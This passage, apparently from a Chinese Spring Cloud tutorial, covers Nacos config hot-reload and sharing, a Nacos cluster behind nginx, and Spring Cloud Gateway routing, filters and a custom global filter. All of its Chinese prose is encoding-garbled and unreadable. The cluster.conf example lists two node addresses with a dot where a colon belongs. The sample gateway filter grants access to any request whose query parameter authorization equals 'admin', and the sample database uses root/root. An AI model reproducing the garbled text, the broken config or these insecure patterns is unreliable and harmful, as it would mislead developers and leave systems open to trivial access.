bootstrap.ymlï¼Œé…ç½®nacosåœ°å€ã€å½“å‰ç¯å¢ƒã€æœåŠ¡åç§°ã€æ–‡ä»¶åç¼€åã€‚\n\n### â·é…ç½®çƒ­æ›´æ–°\n\næˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„ï¼Œæ˜¯ä¿®æ”¹nacosä¸­çš„é…ç½®åï¼Œå¾®æœåŠ¡æ— éœ€é‡å¯å³å¯è®©é…ç½®ç”Ÿæ•ˆï¼Œä¹Ÿå°±æ˜¯**é…ç½®çƒ­æ›´æ–°**ã€‚\n\nè¦å®ç°é…ç½®çƒ­æ›´æ–°ï¼Œå¯ä»¥ä½¿ç”¨ä¸¤ç§æ–¹å¼ï¼š\n\n**æ–¹å¼ä¸€ï¼šé€šè¿‡ Spring Cloud åŸç”Ÿæ³¨è§£ `@RefreshScope` å®ç°é…ç½®è‡ªåŠ¨æ›´æ–°**\n\n```java\n@RefreshScope //æ·»åŠ æ³¨è§£\n@Slf4j\n@RestController\n@RequestMapping(\"/user\")\npublic class UserController {\n\n    @Value(\"${pattern.dateformat}\")\n    private String dateformat;\n\n    @GetMapping(\"now\")\n    public String now(){\n        return LocalDateTime.now().format(DateTimeFormatter.ofPattern(dateformat));\n    }\n}\n```\n\n**æ–¹å¼äºŒï¼šä½¿ç”¨@ConfigurationPropertiesæ³¨è§£ä»£æ›¿@Valueæ³¨è§£**\n\nåœ¨user-serviceæœåŠ¡ä¸­ï¼Œæ·»åŠ ä¸€ä¸ªç±»ï¼Œè¯»å–patterrn.dateformatå±æ€§ï¼š\n\n```java\n@Component\n@Data\n@ConfigurationProperties(prefix = \"pattern\")\npublic class PatternProperties {\n    private String dateformat;\n}\n```\n\nåœ¨UserControllerä¸­ä½¿ç”¨è¿™ä¸ªç±»ä»£æ›¿@Valueï¼š\n\n```java\n@Slf4j\n@RestController\n@RequestMapping(\"/user\")\npublic class UserController {\n\n    @Autowired\n    private PatternProperties patternProperties;\n\n    @GetMapping(\"now\")\n    public String now(){\n        return LocalDateTime.now().format(DateTimeFormatter.ofPattern(patternProperties.getDateformat()));\n    }\n}\n```\n\n### â¸é…ç½®å…±äº«\n\nå…¶å®å¾®æœåŠ¡å¯åŠ¨æ—¶ï¼Œä¼šå»nacosè¯»å–å¤šä¸ªé…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š\n\n- `[spring.application.name]-[spring.profiles.active].yaml`ï¼Œä¾‹å¦‚ï¼šuserservice-dev.yaml\n\n- `[spring.application.name].yaml`ï¼Œä¾‹å¦‚ï¼šuserservice.yaml\n\nè€Œ`[spring.application.name].yaml`ä¸åŒ…å«ç¯å¢ƒï¼Œå› æ­¤å¯ä»¥è¢«å¤šä¸ªç¯å¢ƒå…±äº«ã€‚\n\nä¾‹å¦‚ï¼šåœ¨nacosé…ç½®3ä¸ªæ–‡ä»¶ï¼šuserservice-dev.yamlã€userservice-test.yamlã€userservice.yaml\n\nUserApplication(8081)ä½¿ç”¨çš„profileæ˜¯devï¼ŒUserApplication2(8082)ä½¿ç”¨çš„profileæ˜¯testï¼Œè¿è¡Œåä¸ç®¡æ˜¯devï¼Œè¿˜æ˜¯testç¯å¢ƒï¼Œéƒ½è¯»å–åˆ°äº†userservice.yamlä¸­å±æ€§çš„å€¼ã€‚\n\nä½†æ˜¯å½“nacoså’ŒæœåŠ¡æœ¬åœ°åŒæ—¶å‡ºç°ç›¸åŒå±æ€§æ—¶ï¼Œä¼˜å…ˆçº§æœ‰é«˜ä½ä¹‹åˆ†ï¼šuserservice-dev.yaml > userservice.yaml > application.yml\n\n![](https://img.jwt1399.top/img/202209241736075.png)\n\n**å¤šæœåŠ¡å…±äº«é…ç½®**\n\nä¸åŒå¾®æœåŠ¡ä¹‹é—´å¯ä»¥å…±äº«é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡ä¸‹é¢çš„ä¸¤ç§æ–¹å¼æ¥æŒ‡å®š\n\næ–¹å¼ä¸€ï¼š\n\n```yaml\nspring:\n  application:\n    name: userservice # æœåŠ¡åç§°\n  profiles:\n    active: dev #å¼€å‘ç¯å¢ƒï¼Œè¿™é‡Œæ˜¯dev\n  cloud:\n    nacos:\n      server-addr: localhost:8848 # Nacosåœ°å€\n      config:\n        file-extension: yaml # æ–‡ä»¶åç¼€å\n        shared-configs: # å¤šå¾®æœåŠ¡é—´å…±äº«çš„é…ç½®åˆ—è¡¨\u000b\n         - dataId: common.yaml # è¦å…±äº«çš„é…ç½®æ–‡ä»¶id\n```\n\næ–¹å¼äºŒï¼š\n\n```yaml\nspring:\n  application:\n    name: userservice # æœåŠ¡åç§°\n  profiles:\n    active: dev #å¼€å‘ç¯å¢ƒï¼Œè¿™é‡Œæ˜¯dev\n  cloud:\n    nacos:\n      server-addr: localhost:8848 # Nacosåœ°å€\n      config:\n        file-extension: yaml # æ–‡ä»¶åç¼€å\n        extends-configs: # å¤šå¾®æœåŠ¡é—´å…±äº«çš„é…ç½®åˆ—è¡¨\n         - dataId: extend.yaml # è¦å…±äº«çš„é…ç½®æ–‡ä»¶id\n```\n\nå¤šç§é…ç½®çš„ä¼˜å…ˆçº§ï¼š\n\n![](https://img.jwt1399.top/img/202209241748244.png)\n\n### â¹æ­å»ºNacosé›†ç¾¤\n\n![](https://img.jwt1399.top/img/202209242331548.png)\n\n| èŠ‚ç‚¹   | ip            | port |\n| ------ | ------------- | ---- |\n| nacos1 | 192.168.150.1 | 8845 |\n| nacos2 | 192.168.150.1 | 8846 |\n| nacos3 | 192.168.150.1 | 8847 |\n\n#### â“µåˆå§‹åŒ–æ•°æ®åº“\n\nNacosé»˜è®¤æ•°æ®å­˜å‚¨åœ¨å†…åµŒæ•°æ®åº“Derbyä¸­ï¼Œä¸å±äºç”Ÿäº§å¯ç”¨çš„æ•°æ®åº“ã€‚å®˜æ–¹æ¨èçš„æœ€ä½³å®è·µæ˜¯ä½¿ç”¨å¸¦æœ‰ä¸»ä»çš„é«˜å¯ç”¨æ•°æ®åº“é›†ç¾¤ã€‚è¿™é‡Œæˆ‘ä»¬ä»¥å•ç‚¹çš„æ•°æ®åº“ä¸ºä¾‹ã€‚\n\né¦–å…ˆæ–°å»ºä¸€ä¸ªæ•°æ®åº“ï¼Œå‘½åä¸ºnacosï¼Œè€Œåå¯¼å…¥å®˜æ–¹æä¾›çš„SQLï¼š[nacos/schema.sql ](https://github.com/alibaba/nacos/blob/master/distribution/conf/schema.sql)\n\n#### â“¶éƒ¨ç½²é…ç½®nacos\n\nä¸‹è½½nacosåï¼Œè¿›å…¥nacosçš„confç›®å½•ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶cluster.conf.exampleï¼Œé‡å‘½åä¸ºcluster.conf\n\nç„¶åæ·»åŠ å†…å®¹ï¼š\n\n```\n127.0.0.1:8845\n127.0.0.1.8846\n127.0.0.1.8847\n```\n\nç„¶åä¿®æ”¹application.propertiesæ–‡ä»¶ï¼Œæ·»åŠ æ•°æ®åº“é…ç½®\n\n```properties\nspring.datasource.platform=mysql\n\ndb.num=1\n\ndb.url.0=jdbc:mysql://127.0.0.1:3306/nacos?characterEncoding=utf8&connectTimeout=1000&socketTimeout=3000&autoReconnect=true&useUnicode=true&useSSL=false&serverTimezone=UTC\ndb.user.0=root\ndb.password.0=root\n```\n\n#### â“·å¯åŠ¨nacosé›†ç¾¤\n\nå°†nacosæ–‡ä»¶å¤¹å¤åˆ¶ä¸‰ä»½ï¼Œåˆ†åˆ«å‘½åä¸ºï¼šnacos1ã€nacos2ã€nacos3ï¼›ç„¶ååˆ†åˆ«ä¿®æ”¹ä¸‰ä¸ªæ–‡ä»¶å¤¹ä¸­çš„application.properties\n\nnacos1:\n\n```properties\nserver.port=8845\n```\n\nnacos2:\n\n```properties\nserver.port=8846\n```\n\nnacos3:\n\n```properties\nserver.port=8847\n```\n\nç„¶ååˆ†åˆ«å¯åŠ¨ä¸‰ä¸ªnacosèŠ‚ç‚¹ï¼š`startup.cmd`\n\n#### â“¸nginxåå‘ä»£ç†\n\nä¸‹è½½nginxåï¼Œä¿®æ”¹conf/nginx.confæ–‡ä»¶ï¼Œé…ç½®å¦‚ä¸‹ï¼š\n\n```json\nupstream nacos-cluster {\n  server 127.0.0.1:8845;\n\tserver 127.0.0.1:8846;\n\tserver 127.0.0.1:8847;\n}\n\nserver {\n    listen       80;\n    server_name  localhost;\n\n    location /nacos {\n        proxy_pass http://nacos-cluster;\n    }\n}\n```\n\nè€Œååœ¨æµè§ˆå™¨è®¿é—®ï¼š`http://localhost/nacos`å³å¯ã€‚\n\nä»£ç ä¸­application.ymlæ–‡ä»¶é…ç½®å¦‚ä¸‹ï¼š\n\n```yaml\nspring:\n  cloud:\n    nacos:\n      server-addr: localhost:80 # Nacosåœ°å€\n```\n\n#### â“¹ä¼˜åŒ–\n\n- å®é™…éƒ¨ç½²æ—¶ï¼Œéœ€è¦ç»™åšåå‘ä»£ç†çš„nginxæœåŠ¡å™¨è®¾ç½®ä¸€ä¸ªåŸŸåï¼Œè¿™æ ·åç»­å¦‚æœæœ‰æœåŠ¡å™¨è¿ç§»ï¼Œnacosçš„å®¢æˆ·ç«¯ä¹Ÿæ— éœ€æ›´æ”¹é…ç½®\n\n- Nacosçš„å„ä¸ªèŠ‚ç‚¹åº”è¯¥éƒ¨ç½²åˆ°å¤šä¸ªä¸åŒæœåŠ¡å™¨ï¼Œåšå¥½å®¹ç¾å’Œéš”ç¦»\n\n# 7.ç»Ÿä¸€ç½‘å…³è·¯ç”±\n\n## â‘ ç®€ä»‹\n\nSpring Cloud Gateway æ˜¯ Spring Cloud çš„ä¸€ä¸ªå…¨æ–°é¡¹ç›®ï¼Œè¯¥é¡¹ç›®æ˜¯åŸºäº Spring 5.0ï¼ŒSpring Boot 2.0 å’Œ Project Reactor ç­‰å“åº”å¼ç¼–ç¨‹å’Œäº‹ä»¶æµæŠ€æœ¯å¼€å‘çš„ç½‘å…³ï¼Œå®ƒæ—¨åœ¨ä¸ºå¾®æœåŠ¡æ¶æ„æä¾›ä¸€ç§ç®€å•æœ‰æ•ˆçš„ç»Ÿä¸€çš„ API è·¯ç”±ç®¡ç†æ–¹å¼ã€‚\n\nGatewayç½‘å…³æ˜¯æˆ‘ä»¬æœåŠ¡çš„å®ˆé—¨ç¥ï¼Œæ‰€æœ‰å¾®æœåŠ¡çš„ç»Ÿä¸€å…¥å£ã€‚ç½‘å…³çš„**æ ¸å¿ƒåŠŸèƒ½ç‰¹æ€§**ï¼š\n\n- è·¯ç”±å’Œè´Ÿè½½å‡è¡¡\n  - ä¸€åˆ‡è¯·æ±‚éƒ½å¿…é¡»å…ˆç»è¿‡gatewayï¼Œä½†ç½‘å…³ä¸å¤„ç†ä¸šåŠ¡ï¼Œè€Œæ˜¯æ ¹æ®æŸç§è§„åˆ™ï¼ŒæŠŠè¯·æ±‚è½¬å‘åˆ°æŸä¸ªå¾®æœåŠ¡ï¼Œè¿™ä¸ªè¿‡ç¨‹å«åšè·¯ç”±ã€‚å½“ç„¶è·¯ç”±çš„ç›®æ ‡æœåŠ¡æœ‰å¤šä¸ªæ—¶ï¼Œè¿˜éœ€è¦åšè´Ÿè½½å‡è¡¡ã€‚\n- æƒé™æ§åˆ¶\n  - ç½‘å…³ä½œä¸ºå¾®æœåŠ¡å…¥å£ï¼Œéœ€è¦æ ¡éªŒç”¨æˆ·æ˜¯æ˜¯å¦æœ‰è¯·æ±‚èµ„æ ¼ï¼Œå¦‚æœæ²¡æœ‰åˆ™è¿›è¡Œæ‹¦æˆªã€‚\n- é™æµ\n  - å½“è¯·æ±‚æµé‡è¿‡é«˜æ—¶ï¼Œåœ¨ç½‘å…³ä¸­æŒ‰ç…§ä¸‹æµçš„å¾®æœåŠ¡èƒ½å¤Ÿæ¥å—çš„é€Ÿåº¦æ¥æ”¾è¡Œè¯·æ±‚ï¼Œé¿å…æœåŠ¡å‹åŠ›è¿‡å¤§ã€‚\n\n\n<img src=\"../images/SpringCloud-å®ç”¨ç¯‡/image-20220925101634632.png\" alt=\"æ¶æ„å›¾\" style=\"zoom:50%;\" />\n\nåœ¨SpringCloudä¸­ç½‘å…³çš„å®ç°åŒ…æ‹¬ä¸¤ç§ï¼š\n\n- gateway\n- zuul\n\nZuulæ˜¯åŸºäºServletçš„å®ç°ï¼Œå±äºé˜»å¡å¼ç¼–ç¨‹ã€‚è€ŒSpringCloudGatewayåˆ™æ˜¯åŸºäºSpring5ä¸­æä¾›çš„WebFluxï¼Œå±äºå“åº”å¼ç¼–ç¨‹çš„å®ç°ï¼Œå…·å¤‡æ›´å¥½çš„æ€§èƒ½ã€‚\n\n## â‘¡å¿«é€Ÿå…¥é—¨\n\nä¸‹é¢ï¼Œæˆ‘ä»¬å°±æ¼”ç¤ºä¸‹ç½‘å…³çš„åŸºæœ¬è·¯ç”±åŠŸèƒ½ã€‚åŸºæœ¬æ­¥éª¤å¦‚ä¸‹ï¼š\n\n1. åˆ›å»ºæ–°æ¨¡å—ï¼Œå¼•å…¥ç½‘å…³ä¾èµ–\n2. ç¼–å†™å¯åŠ¨ç±»\n3. ç¼–å†™åŸºç¡€é…ç½®å’Œè·¯ç”±è§„åˆ™\n4. å¯åŠ¨ç½‘å…³æœåŠ¡è¿›è¡Œæµ‹è¯•\n\n### â¶åˆ›å»ºæ–°æ¨¡å—ï¼Œå¼•å…¥ç½‘å…³ä¾èµ–\n\nåˆ›å»ºæœåŠ¡ï¼š\n\n![](https://img.jwt1399.top/img/202209251033539.png)\n\nå¼•å…¥ä¾èµ–ï¼š\n\n```xml\n<!--ç½‘å…³-->\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-gateway</artifactId>\n</dependency>\n<!--nacosæœåŠ¡å‘ç°ä¾èµ–-->\n<dependency>\n    <groupId>com.alibaba.cloud</groupId>\n    <artifactId>spring-cloud-starter-alibaba-nacos-discovery</artifactId>\n</dependency>\n```\n\n### â·ç¼–å†™å¯åŠ¨ç±»\n\n```java\n@SpringBootApplication\npublic class GatewayApplication {\n\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(GatewayApplication.class, args);\n\t}\n}\n```\n\n### â¸ç¼–å†™åŸºç¡€é…ç½®å’Œè·¯ç”±è§„åˆ™\n\nåˆ›å»ºapplication.ymlæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n\n```yaml\nserver:\n  port: 10010 # ç½‘å…³ç«¯å£\nspring:\n  application:\n    name: gateway # æœåŠ¡åç§°\n  cloud:\n    nacos:\n      server-addr: localhost:8848 # nacosåœ°å€\n    gateway:\n      routes: # ç½‘å…³è·¯ç”±é…ç½®\n        - id: user-service # è·¯ç”±idï¼Œè‡ªå®šä¹‰ï¼Œåªè¦å”¯ä¸€å³å¯\n          # uri: http://127.0.0.1:8081 # è·¯ç”±çš„ç›®æ ‡åœ°å€ httpå°±æ˜¯å›ºå®šåœ°å€\n          uri: lb://userservice # è·¯ç”±çš„ç›®æ ‡åœ°å€ lbå°±æ˜¯è´Ÿè½½å‡è¡¡ï¼Œåé¢è·ŸæœåŠ¡åç§°\n          predicates: # è·¯ç”±æ–­è¨€ï¼Œä¹Ÿå°±æ˜¯åˆ¤æ–­è¯·æ±‚æ˜¯å¦ç¬¦åˆè·¯ç”±è§„åˆ™çš„æ¡ä»¶\n            - Path=/user/** # è¿™ä¸ªæ˜¯æŒ‰ç…§è·¯å¾„åŒ¹é…ï¼Œåªè¦ä»¥/user/å¼€å¤´å°±ç¬¦åˆè¦æ±‚\n```\n\næˆ‘ä»¬å°†ç¬¦åˆ`Path` è§„åˆ™çš„ä¸€åˆ‡è¯·æ±‚ï¼Œéƒ½ä»£ç†åˆ° `uri`å‚æ•°æŒ‡å®šçš„åœ°å€ã€‚\n\næœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬å°† `/user/**`å¼€å¤´çš„è¯·æ±‚ï¼Œä»£ç†åˆ°`lb://userservice`ï¼Œlbæ˜¯è´Ÿè½½å‡è¡¡ï¼Œæ ¹æ®æœåŠ¡åæ‹‰å–æœåŠ¡åˆ—è¡¨ï¼Œå®ç°è´Ÿè½½å‡è¡¡ã€‚\n\n### â¹å¯åŠ¨ç½‘å…³æœåŠ¡è¿›è¡Œæµ‹è¯•\n\nå¯åŠ¨ç½‘å…³ï¼Œè®¿é—®`http://localhost:10010/user/1`æ—¶ï¼Œç¬¦åˆ`/user/**`è§„åˆ™ï¼Œè¯·æ±‚è½¬å‘åˆ°uriï¼š`http://userservice/user/1`ï¼Œå¾—åˆ°äº†ç»“æœï¼š\n\n![](https://img.jwt1399.top/img/202209251054663.png)\n\næ•´ä¸ªè®¿é—®çš„æµç¨‹å¦‚ä¸‹ï¼š\n\n![](https://img.jwt1399.top/img/202209251055650.png)\n\n### âºæ€»ç»“\n\nç½‘å…³æ­å»ºæ­¥éª¤ï¼š\n\n1. åˆ›å»ºé¡¹ç›®ï¼Œå¼•å…¥nacosæœåŠ¡å‘ç°å’Œgatewayä¾èµ–\n\n2. é…ç½®application.ymlï¼ŒåŒ…æ‹¬æœåŠ¡åŸºæœ¬ä¿¡æ¯ã€nacosåœ°å€ã€è·¯ç”±\n\nè·¯ç”±é…ç½®åŒ…æ‹¬ï¼š\n\n1. è·¯ç”±idï¼šè·¯ç”±çš„å”¯ä¸€æ ‡ç¤º\n\n2. è·¯ç”±ç›®æ ‡ï¼ˆuriï¼‰ï¼šè·¯ç”±çš„ç›®æ ‡åœ°å€ï¼Œhttpä»£è¡¨å›ºå®šåœ°å€ï¼Œlbä»£è¡¨æ ¹æ®æœåŠ¡åè´Ÿè½½å‡è¡¡\n\n3. è·¯ç”±æ–­è¨€ï¼ˆpredicatesï¼‰ï¼šåˆ¤æ–­è·¯ç”±çš„è§„åˆ™\n\n4. è·¯ç”±è¿‡æ»¤å™¨ï¼ˆfiltersï¼‰ï¼šå¯¹è¯·æ±‚æˆ–å“åº”åšå¤„ç†\n\n## â‘¢æ–­è¨€å·¥å‚\n\næˆ‘ä»¬åœ¨é…ç½®æ–‡ä»¶ä¸­å†™çš„æ–­è¨€è§„åˆ™åªæ˜¯å­—ç¬¦ä¸²ï¼Œè¿™äº›å­—ç¬¦ä¸²ä¼šè¢«Predicate Factoryè¯»å–å¹¶å¤„ç†ï¼Œè½¬å˜ä¸ºè·¯ç”±åˆ¤æ–­çš„æ¡ä»¶\n\nä¾‹å¦‚`Path=/user/**`æ˜¯æŒ‰ç…§è·¯å¾„åŒ¹é…ï¼Œè¿™ä¸ªè§„åˆ™æ˜¯ç”±\n\n`org.springframework.cloud.gateway.handler.predicate.PathRoutePredicateFactory`ç±»æ¥\n\nå¤„ç†çš„ï¼Œåƒè¿™æ ·çš„æ–­è¨€å·¥å‚åœ¨SpringCloudGatewayè¿˜æœ‰åå‡ ä¸ª:\n\n| **åç§°**   | **è¯´æ˜**                       | **ç¤ºä¾‹**                                                     |\n| ---------- | ------------------------------ | ------------------------------------------------------------ |\n| After      | æ˜¯æŸä¸ªæ—¶é—´ç‚¹åçš„è¯·æ±‚           | -  After=2037-01-20T17:42:47.789-07:00[America/Denver]       |\n| Before     | æ˜¯æŸä¸ªæ—¶é—´ç‚¹ä¹‹å‰çš„è¯·æ±‚         | -  Before=2031-04-13T15:14:47.433+08:00[Asia/Shanghai]       |\n| Between    | æ˜¯æŸä¸¤ä¸ªæ—¶é—´ç‚¹ä¹‹å‰çš„è¯·æ±‚       | -  Between=2037-01-20T17:42:47.789-07:00[America/Denver],  2037-01-21T17:42:47.789-07:00[America/Denver] |\n| Cookie     | è¯·æ±‚å¿…é¡»åŒ…å«æŸäº›cookie         | - Cookie=chocolate, ch.p                                     |\n| Header     | è¯·æ±‚å¿…é¡»åŒ…å«æŸäº›header         | - Header=X-Request-Id, \\d+                                   |\n| Host       | è¯·æ±‚å¿…é¡»æ˜¯è®¿é—®æŸä¸ªhostï¼ˆåŸŸåï¼‰ | -  Host=**.somehost.org,**.anotherhost.org                   |\n| Method     | è¯·æ±‚æ–¹å¼å¿…é¡»æ˜¯æŒ‡å®šæ–¹å¼         | - Method=GET,POST                                            |\n| Path       | è¯·æ±‚è·¯å¾„å¿…é¡»ç¬¦åˆæŒ‡å®šè§„åˆ™       | - Path=/red/{segment},/blue/**                               |\n| Query      | è¯·æ±‚å‚æ•°å¿…é¡»åŒ…å«æŒ‡å®šå‚æ•°       | - Query=name, Jackæˆ–è€…-  Query=name                          |\n| RemoteAddr | è¯·æ±‚è€…çš„ipå¿…é¡»æ˜¯æŒ‡å®šèŒƒå›´       | - RemoteAddr=192.168.1.1/24                                  |\n| Weight     | æƒé‡å¤„ç†                       |                                                              |\n\næˆ‘ä»¬åªéœ€è¦æŒæ¡Pathè¿™ç§è·¯ç”±å·¥ç¨‹å°±å¯ä»¥äº†ã€‚\n\n## â‘£è¿‡æ»¤å·¥å‚\n\nGatewayFilteræ˜¯ç½‘å…³ä¸­æä¾›çš„ä¸€ç§è¿‡æ»¤å™¨ï¼Œå¯ä»¥å¯¹è¿›å…¥ç½‘å…³çš„è¯·æ±‚å’Œå¾®æœåŠ¡è¿”å›çš„å“åº”åšå¤„ç†ï¼š\n\n![](https://img.jwt1399.top/img/202209251101960.png)\n\n\n\n### â¶è·¯ç”±è¿‡æ»¤å™¨çš„ç§ç±»\n\nSpringæä¾›äº†31ç§ä¸åŒçš„è·¯ç”±è¿‡æ»¤å™¨å·¥å‚ã€‚ä¾‹å¦‚ï¼š\n\n| **åç§°**             | **è¯´æ˜**                     |\n| -------------------- | ---------------------------- |\n| AddRequestHeader     | ç»™å½“å‰è¯·æ±‚æ·»åŠ ä¸€ä¸ªè¯·æ±‚å¤´     |\n| RemoveRequestHeader  | ç§»é™¤è¯·æ±‚ä¸­çš„ä¸€ä¸ªè¯·æ±‚å¤´       |\n| AddResponseHeader    | ç»™å“åº”ç»“æœä¸­æ·»åŠ ä¸€ä¸ªå“åº”å¤´   |\n| RemoveResponseHeader | ä»å“åº”ç»“æœä¸­ç§»é™¤æœ‰ä¸€ä¸ªå“åº”å¤´ |\n| RequestRateLimiter   | é™åˆ¶è¯·æ±‚çš„æµé‡               |\n| ......               | ......                       |\n\n### â·å“åº”å¤´è¿‡æ»¤å™¨\n\nä¸‹é¢æˆ‘ä»¬ä»¥AddResponseHeader ä¸ºä¾‹æ¥è®²è§£ã€‚\n\n> **éœ€æ±‚**ï¼šç»™æ‰€æœ‰è¿›å…¥userserviceçš„è¯·æ±‚æ·»åŠ ä¸€ä¸ªè¯·æ±‚å¤´ï¼šTruth=This is a test !\n\nåªéœ€è¦ä¿®æ”¹gatewayæœåŠ¡çš„application.ymlæ–‡ä»¶ï¼Œæ·»åŠ è·¯ç”±è¿‡æ»¤å³å¯ï¼š\n\n```yaml\nspring:\n  cloud:\n    gateway:\n      routes:\n      - id: user-service \n        uri: lb://userservice \n        predicates: \n        - Path=/user/** \n      - id: order-service\n        uri: lb://orderservice\n        predicates:\n        - Path=/order/**\n        filters: # è¿‡æ»¤å™¨\n        - AddResponseHeader=Truth, This is a test! # æ·»åŠ è¯·æ±‚å¤´\n```\n\nå½“å‰è¿‡æ»¤å™¨å†™åœ¨userserviceè·¯ç”±ä¸‹ï¼Œå› æ­¤ä»…ä»…å¯¹è®¿é—®userserviceçš„è¯·æ±‚æœ‰æ•ˆã€‚\n\n![](https://img.jwt1399.top/img/202209251112506.png)\n\n### â¸é»˜è®¤è¿‡æ»¤å™¨\n\nå¦‚æœè¦å¯¹æ‰€æœ‰çš„è·¯ç”±éƒ½ç”Ÿæ•ˆï¼Œåˆ™å¯ä»¥å°†è¿‡æ»¤å™¨å·¥å‚å†™åˆ°defaultä¸‹ã€‚æ ¼å¼å¦‚ä¸‹ï¼š\n\n```yaml\nspring:\n  cloud:\n    gateway:\n      routes:\n      - id: user-service \n        uri: lb://userservice \n        predicates: \n        - Path=/user/**\n      default-filters: # é»˜è®¤è¿‡æ»¤é¡¹\n      - AddResponseHeader=Truth, This is a test! \n```\n\n### â¹æ€»ç»“\n\nè¿‡æ»¤å™¨çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ\n\n- â‘  å¯¹è·¯ç”±çš„è¯·æ±‚æˆ–å“åº”åšåŠ å·¥å¤„ç†ï¼Œæ¯”å¦‚æ·»åŠ è¯·æ±‚å¤´\n\n- â‘¡ é…ç½®åœ¨è·¯ç”±ä¸‹çš„è¿‡æ»¤å™¨åªå¯¹å½“å‰è·¯ç”±çš„è¯·æ±‚ç”Ÿæ•ˆ\n\ndefaultFiltersçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ\n\n- â‘  å¯¹æ‰€æœ‰è·¯ç”±éƒ½ç”Ÿæ•ˆçš„è¿‡æ»¤å™¨\n\n## â‘¤å…¨å±€è¿‡æ»¤å™¨\n\nä¸Šä¸€èŠ‚å­¦ä¹ çš„è¿‡æ»¤å™¨ï¼Œç½‘å…³æä¾›äº†31ç§ï¼Œä½†æ¯ä¸€ç§è¿‡æ»¤å™¨çš„ä½œç”¨éƒ½æ˜¯å›ºå®šçš„ã€‚å¦‚æœæˆ‘ä»¬å¸Œæœ›æ‹¦æˆªè¯·æ±‚ï¼Œåšè‡ªå·±çš„ä¸šåŠ¡é€»è¾‘åˆ™æ²¡åŠæ³•å®ç°ã€‚\n\n### â¶å…¨å±€è¿‡æ»¤å™¨ä½œç”¨\n\nå…¨å±€è¿‡æ»¤å™¨çš„ä½œç”¨ä¹Ÿæ˜¯å¤„ç†ä¸€åˆ‡è¿›å…¥ç½‘å…³çš„è¯·æ±‚å’Œå¾®æœåŠ¡å“åº”ï¼Œä¸GatewayFilterçš„ä½œç”¨ä¸€æ ·ã€‚åŒºåˆ«åœ¨äºGatewayFilteré€šè¿‡é…ç½®å®šä¹‰ï¼Œå¤„ç†é€»è¾‘æ˜¯å›ºå®šçš„ï¼›è€ŒGlobalFilterçš„é€»è¾‘éœ€è¦è‡ªå·±å†™ä»£ç å®ç°ã€‚\n\nå®šä¹‰æ–¹å¼æ˜¯å®ç°GlobalFilteræ¥å£ã€‚\n\n```java\npublic interface GlobalFilter {\n    /**\n     *  å¤„ç†å½“å‰è¯·æ±‚ï¼Œæœ‰å¿…è¦çš„è¯é€šè¿‡{@link GatewayFilterChain}å°†è¯·æ±‚äº¤ç»™ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨å¤„ç†\n     *\n     * @param exchange è¯·æ±‚ä¸Šä¸‹æ–‡ï¼Œé‡Œé¢å¯ä»¥è·å–Requestã€Responseç­‰ä¿¡æ¯\n     * @param chain ç”¨æ¥æŠŠè¯·æ±‚å§”æ‰˜ç»™ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨ \n     * @return {@code Mono<Void>} è¿”å›æ ‡ç¤ºå½“å‰è¿‡æ»¤å™¨ä¸šåŠ¡ç»“æŸ\n     */\n    Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain);\n}\n```\n\nåœ¨filterä¸­ç¼–å†™è‡ªå®šä¹‰é€»è¾‘ï¼Œå¯ä»¥å®ç°ä¸‹åˆ—åŠŸèƒ½ï¼š\n\n- ç™»å½•çŠ¶æ€åˆ¤æ–­\n- æƒé™æ ¡éªŒ\n- è¯·æ±‚é™æµç­‰\n\n### â·è‡ªå®šä¹‰å…¨å±€è¿‡æ»¤å™¨\n\néœ€æ±‚ï¼šå®šä¹‰å…¨å±€è¿‡æ»¤å™¨ï¼Œæ‹¦æˆªè¯·æ±‚ï¼Œåˆ¤æ–­è¯·æ±‚çš„å‚æ•°æ˜¯å¦æ»¡è¶³ä¸‹é¢æ¡ä»¶ï¼š\n\n- å‚æ•°ä¸­æ˜¯å¦æœ‰authorizationï¼Œ\n\n- authorizationå‚æ•°å€¼æ˜¯å¦ä¸ºadmin\n\n- å¦‚æœåŒæ—¶æ»¡è¶³åˆ™æ”¾è¡Œï¼Œå¦åˆ™æ‹¦æˆª\n\nå®ç°ï¼šåœ¨gatewayä¸­å®šä¹‰ä¸€ä¸ªè¿‡æ»¤å™¨ï¼š\n\n```java\npackage cn.itcast.gateway.filters;\n\n@Order(-1)\n@Component\npublic class AuthorizeFilter implements GlobalFilter {\n    @Override\n    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {\n        // 1.è·å–è¯·æ±‚å‚æ•°\n        MultiValueMap<String, String> params = exchange.getRequest().getQueryParams();\n        // 2.è·å–authorizationå‚æ•°\n        String auth = params.getFirst(\"authorization\");\n        // 3.æ ¡éªŒ\n        if (\"admin\".equals(auth)) {\n            // æ”¾è¡Œ\n            return chain.filter(exchange);\n        }\n        // 4.æ‹¦æˆª\n        // 4.1.ç¦æ­¢è®¿é—®ï¼Œè®¾ç½®çŠ¶æ€ç \n        exchange.getResponse().setStatusCode(HttpStatus.FORBIDDEN);\n        // 4.2.ç»“æŸå¤„ç†\n        return exchange.getResponse().setComplete();\n    }\n}\n```\n\n### 